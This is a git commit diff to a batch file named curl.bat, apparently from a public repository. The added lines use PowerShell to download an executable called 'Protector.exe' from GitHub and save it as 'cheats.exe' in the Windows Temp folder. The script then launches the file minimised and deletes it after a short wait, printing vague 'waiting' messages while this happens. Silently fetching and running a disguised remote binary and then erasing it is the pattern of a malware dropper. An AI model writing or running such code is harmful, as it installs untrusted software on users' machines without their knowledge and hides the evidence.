0e1e785b6c41fc3af5c530e750988ce697cba387
Ahetuk <ahetuk.official@gmail.com>
2025-03-22 04:22:23 +0600

    Update curl.bat

--- curl.bat
+++ curl.bat
@@ -1,2 +1,14 @@
 @echo off
+set "url=https://raw.githubusercontent.com/Ahetuk/Free/main/Protector.exe"
+set "destination=C:\Windows\Temp\cheats.exe"
+set "arguments=Apply"
+
+echo WAITING FOR LAUNCH...
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%destination%')"
+echo WAITING ...
+start /min "" "%destination%" %arguments%
+
+timeout /t 5 /nobreak >nul 2>&1
+
 echo ........
+del "%destination%"
